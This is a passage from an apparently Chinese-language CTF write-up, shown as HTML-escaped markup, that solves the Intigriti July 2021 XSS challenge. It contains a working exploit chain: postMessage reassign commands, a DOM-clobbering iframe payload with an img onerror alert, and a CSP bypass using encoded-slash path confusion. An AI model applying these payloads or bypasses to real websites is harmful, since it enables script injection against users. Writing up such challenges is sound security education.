string&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token function&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;[reassign]: &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token template-string&quot;&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;Value of &quot;&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;o&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;a&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot; was changed to &quot;&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;o&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;b&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; type&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;warn&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;err&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token function&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;[reassign]: &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token template-string&quot;&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;Error changing value (&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;err&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;message&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; type&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;err&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我可以這樣做：&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;win&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;frames&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;postMessage&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    cmd&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;reassign&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;    message&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;      a&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;Z&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;      b&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;x+1&#39;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;    credentials&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;*&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;這就等於是 &lt;code&gt;Z=x+1&lt;/code&gt;，然後 &lt;code&gt;x+1&lt;/code&gt; 的時候會因為自動轉型的關係變成字串，這樣一來 Z 就會是一個含有我們 payload 的字串了。&lt;/p&gt;
&lt;h2 id=&quot;%E7%AC%AC%E4%BA%94%E9%97%9C%EF%BC%9A%E7%B9%9E%E9%81%8E-encode&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%AC%AC%E4%BA%94%E9%97%9C%EF%BC%9A%E7%B9%9E%E9%81%8E-encode&quot;&gt;#&lt;/a&gt; 第五關：繞過 encode&lt;/h2&gt;
&lt;p&gt;雖然我們現在可以傳字串進去了，但還有一件事情要搞定，那就是因為 href 裡面的東西是 URL 所以會被 encode，例如說 &lt;code&gt;&amp;lt;&lt;/code&gt; 會變成 &lt;code&gt;%3C&lt;/code&gt;：&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; a &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;a&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;href&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;ftp://a:a@a#&amp;lt;img src=x onload=alert(1)&gt;&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;console&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;a&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token comment&quot;&gt;// ftp://a:a@a/#%3Cimg%20src=x%20onload=alert(1)%3E1&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;這又要怎麼辦呢？&lt;/p&gt;
&lt;p&gt;在 &lt;code&gt;log&lt;/code&gt; 裡面有一行是 &lt;code&gt;data = parse(data)&lt;/code&gt;，而 parse 的程式碼是這樣的：&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;token function-variable function&quot;&gt;parse&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;typeof&lt;/span&gt; e &lt;span class=&quot;token operator&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;string&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;e&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token constant&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;stringify&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;e&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// make object look like string&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果 e 是字串，那就回傳 &lt;code&gt;s(e)&lt;/code&gt;，而這個 s 是另外一個函式。&lt;/p&gt;
&lt;p&gt;當初在看程式碼的時候，我看到 reassign 那邊對於 eval 的檢查時，就注意到了它的規則：&lt;code&gt;RegExp = /^[s-zA-Z-+0-9]+$/;&lt;/code&gt;，還有底下這四個函式：&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;token function-variable function&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; s&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;anchor&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;token function-variable function&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; s&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;normalize&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;NFC&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;token function-variable function&quot;&gt;u&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;unescape&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;token function-variable function&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; s&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x16&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其中 s, u 跟 t 這三個字元都是允許的，也就是說，可以透過 reassign 這個指令把他們互換！我們可以把 &lt;code&gt;s&lt;/code&gt; 換成 &lt;code&gt;u&lt;/code&gt;，這樣 data 就會被 unescape 了！&lt;/p&gt;
&lt;p&gt;所以最後的程式碼會長這樣：&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; htmlUrl &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;https://challenge-0721.intigriti.io/htmledit.php?code=&#39;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; insertPayload&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token template-string&quot;&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&amp;lt;img src=x onerror=alert(1)&gt;&lt;/span&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; payload &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token template-string&quot;&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&lt;br&gt;  &amp;lt;a id=&quot;DEV&quot;&gt;&amp;lt;/a&gt;&lt;br&gt;  &amp;lt;iframe name=&quot;store&quot; srcdoc=&#39;&lt;br&gt;    &amp;lt;a id=&quot;users&quot;&gt;&amp;lt;/a&gt;&lt;br&gt;    &amp;lt;a id=&quot;users&quot; name=&quot;admin&quot; href=&quot;ftp://a:a@a#&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;escape&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;insertPayload&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;&gt;&amp;lt;/a&gt;&lt;br&gt;  &#39;&gt;&amp;lt;/iframe&gt;&lt;br&gt;  &amp;lt;iframe name=&quot;iframeConsole&quot; src=&quot;https://challenge-0721.intigriti.io/console.php&quot;&gt;&amp;lt;/iframe&gt;&lt;br&gt;&lt;/span&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; win &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; window&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;htmlUrl &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;encodeURIComponent&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;payload&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token comment&quot;&gt;// 等待 window 載入完成&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token function&quot;&gt;setTimeout&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;  console&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;go&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; credentials &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    username&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;    password&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;a&#39;&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token comment&quot;&gt;// s=u&lt;/span&gt;&lt;br&gt;  win&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;frames&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;postMessage&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    cmd&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;reassign&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;    message&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;      a&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;s&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;      b&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;u&#39;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;    credentials&lt;br&gt;  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;*&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;br&gt;  &lt;span class=&quot;token comment&quot;&gt;// Z=x+1 so Z = x.href + 1&lt;/span&gt;&lt;br&gt;  win&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;frames&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;postMessage&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    cmd&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;reassign&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;    message&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;      a&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;Z&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;      b&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;x+1&#39;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;    credentials&lt;br&gt;  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;*&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;br&gt;  &lt;span class=&quot;token comment&quot;&gt;// log window[Z]&lt;/span&gt;&lt;br&gt;  win&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;frames&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;postMessage&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    cmd&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;logv&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;    message&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;Z&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;    credentials&lt;br&gt;  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;*&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;5000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;所以 data 會是 &lt;code&gt;ftp://a:a@a#&amp;lt;img src=x onerror=alert(1)&amp;gt;&lt;/code&gt;，然後被設定到 HTML 上面，觸發 XSS！&lt;/p&gt;
&lt;p&gt;不，事情沒那麼順利...我忘記有 CSP 了。&lt;/p&gt;
&lt;h2 id=&quot;%E7%AC%AC%E5%85%AD%E9%97%9C%EF%BC%9A%E7%B9%9E%E9%81%8E-csp&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%AC%AC%E5%85%AD%E9%97%9C%EF%BC%9A%E7%B9%9E%E9%81%8E-csp&quot;&gt;#&lt;/a&gt; 第六關：繞過 CSP&lt;/h2&gt;
&lt;p&gt;雖然我可以插入任意 HTML，但很遺憾地這個網頁也有 CSP：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;script-src 
&#39;nonce-xxx&#39; 
https://challenge-0721.intigriti.io/analytics/ 
&#39;unsafe-eval&#39;;

frame-src https:;

object-src &#39;none&#39;;base-uri &#39;none&#39;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;因為沒有 &lt;code&gt;unsafe-inline&lt;/code&gt;，所以我們之前的 payload 是無效的。而這一段 CSP 當中，&lt;code&gt;https://challenge-0721.intigriti.io/analytics/&lt;/code&gt; 顯然是個很可疑的路徑。&lt;/p&gt;
&lt;p&gt;這個頁面其實有引入一個 &lt;a href=&quot;https://challenge-0721.intigriti.io/analytics/main.js&quot;&gt;https://challenge-0721.intigriti.io/analytics/main.js&lt;/a&gt; 的檔案，但裡面沒有東西，只有一些註解而已。&lt;/p&gt;
&lt;p&gt;其實看到這邊的時候我就知道要怎麼做了，因為我之前有學到一個繞過 CSP 的技巧，利用&lt;code&gt;%2F&lt;/code&gt;（編碼過後的 &lt;code&gt;/&lt;/code&gt;）以及前後端對於 URL 解析的不一致。&lt;/p&gt;
&lt;p&gt;以 &lt;code&gt;https://challenge-0721.intigriti.io/analytics/..%2fhtmledit.php&lt;/code&gt; 為例，對瀏覽器來說，這個 URL 是在 &lt;code&gt;/analytics&lt;/code&gt; 底下，所以可以通過 CSP 的檢查。&lt;/p&gt;
&lt;p&gt;但是對伺服器來說，這一段是 &lt;code&gt;https://challenge-0721.intigriti.io/analytics/../htmledit.php&lt;/code&gt; 也就是 &lt;code&gt;https://challenge-0721.intigriti.io/htmledit.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;所以我們成功繞過了 CSP，載入不同路徑的檔案！&lt;/p&gt;
&lt;p&gt;因此現在的目標就變成我們要找一個檔案裡面可以讓我們放 JS 程式碼。看來看去都只有 htmledit.php 能用，但它不是一個 HTML 嗎？&lt;/p&gt;
&lt;h2 id=&quot;%E7%AC%AC%E4%B8%83%E9%97%9C%EF%BC%9A%E6%A7%8B%E9%80%A0-js-%E7%A8%8B%E5%BC%8F%E7%A2%BC&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%AC%AC%E4%B8%83%E9%97%9C%EF%BC%9A%E6%A7%8B%E9%80%A0-js-%E7%A8%8B%E5%BC%8F%E7%A2%BC&quot;&gt;#&lt;/a&gt; 第七關：構造 JS 程式碼&lt;/h2&gt;
&lt;p&gt;如果你還記得的話，這個頁面的開頭有一段是 HTML 的註解：&lt;/p&gt;
&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;&amp;lt;!-- &amp;amp;lt;img src=x&amp;amp;gt; --&gt;&lt;/span&gt;&lt;br&gt;....&lt;/code&gt;&lt;/pre&gt;
